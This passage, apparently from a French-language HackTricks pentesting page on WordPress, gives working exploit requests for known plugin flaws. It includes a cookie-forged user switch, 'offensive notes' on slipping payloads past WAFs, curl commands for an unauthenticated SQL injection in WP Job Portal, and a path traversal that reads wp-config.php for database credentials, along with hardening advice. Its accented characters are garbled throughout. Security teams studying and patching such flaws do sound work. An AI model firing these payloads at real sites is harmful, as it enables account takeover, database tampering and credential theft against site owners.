- Le hook public `init` rend le gestionnaire accessible aux utilisateurs non authentifi√©s (pas de garde `is_user_logged_in()`).
- L'identit√© est d√©riv√©e d'un cookie modifiable par le client (`original_user_id`).
- Un appel direct √† `wp_set_auth_cookie($uid)` connecte le requ√©rant en tant que cet utilisateur sans v√©rification des capabilities/nonce.

Exploitation (sans authentification)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Consid√©rations WAF pour les CVE WordPress/plugins

Les WAFs g√©n√©riques en p√©riph√©rie/serveur sont configur√©s pour des motifs larges (SQLi, XSS, LFI). De nombreuses vuln√©rabilit√©s WordPress/plugins √† fort impact sont des bugs de logique d'application ou d'authentification sp√©cifiques √† l'application qui ressemblent √† du trafic b√©nin, sauf si le moteur comprend les routes WordPress et la s√©mantique des plugins.

Notes offensives

- Ciblez les endpoints sp√©cifiques aux plugins avec des payloads propres : `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Testez d'abord les chemins non authentifi√©s (AJAX `nopriv`, REST avec permissive `permission_callback`, shortcodes publics). Les payloads par d√©faut r√©ussissent souvent sans obfuscation.
- Cas typiques √† fort impact : escalade de privil√®ges (broken access control), arbitrary file upload/download, LFI, open redirect.

Notes d√©fensives

- Ne comptez pas sur des signatures WAF g√©n√©riques pour prot√©ger les CVE des plugins. Mettez en place des correctifs virtuels sp√©cifiques √† la vuln√©rabilit√© au niveau application ou mettez √† jour rapidement.
- Privil√©giez des contr√¥les de s√©curit√© en mode positif dans le code (capabilities, nonces, validation stricte des entr√©es) plut√¥t que des filtres n√©gatifs bas√©s sur des regex.

## Protection WordPress

### Mises √† jour r√©guli√®res

Assurez-vous que WordPress, les plugins et les th√®mes sont √† jour. Confirmez √©galement que la mise √† jour automatique est activ√©e dans wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
De plus, **n'installez que des plugins et th√®mes WordPress fiables**.

### Plugins de s√©curit√©

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Autres recommandations**

- Supprimez l'utilisateur par d√©faut **admin**
- Utilisez des **mots de passe forts** et **2FA**
- Passez **p√©riodiquement en revue** les **autorisations** des utilisateurs
- **Limitez les tentatives de connexion** pour pr√©venir les attaques Brute Force
- Renommez le fichier **`wp-admin.php`** et n'autorisez l'acc√®s que depuis l'interne ou depuis certaines adresses IP.


### SQL Injection non authentifi√©e due √† une validation insuffisante (WP Job Portal <= 2.3.2)

Le plugin de recrutement WP Job Portal exposait une t√¢che **savecategory** qui ex√©cute finalement le code vuln√©rable suivant dans `modules/category/model.php::validateFormData()` :
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Probl√®mes introduits par cet extrait :

1. **Entr√©e utilisateur non assainie** ‚Äì `parentid` provient directement de la requ√™te HTTP.
2. **Concat√©nation de cha√Ænes dans la clause WHERE** ‚Äì pas de `is_numeric()` / `esc_sql()` / prepared statement.
3. **Accessible sans authentification** ‚Äì bien que l'action soit ex√©cut√©e via `admin-post.php`, la seule v√©rification en place est un **CSRF nonce** (`wp_verify_nonce()`), que n'importe quel visiteur peut r√©cup√©rer depuis une page publique incorporant le shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. R√©cup√©rer un nonce r√©cent :
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injecter du SQL arbitraire en abusant de `parentid` :
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
La r√©ponse divulgue le r√©sultat de la requ√™te inject√©e ou modifie la base de donn√©es, prouvant une SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Une autre t√¢che, **downloadcustomfile**, permettait aux visiteurs de t√©l√©charger **n'importe quel fichier sur le disque** via path traversal. Le sink vuln√©rable se trouve dans `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` est contr√¥l√© par l'attaquant et concat√©n√© **sans assainissement**.  Encore une fois, la seule barri√®re est un **CSRF nonce** qui peut √™tre r√©cup√©r√© depuis la page du CV.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Le serveur r√©pond avec le contenu de `wp-config.php`, leaking DB credentials and auth keys.

## R√©f√©rences

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
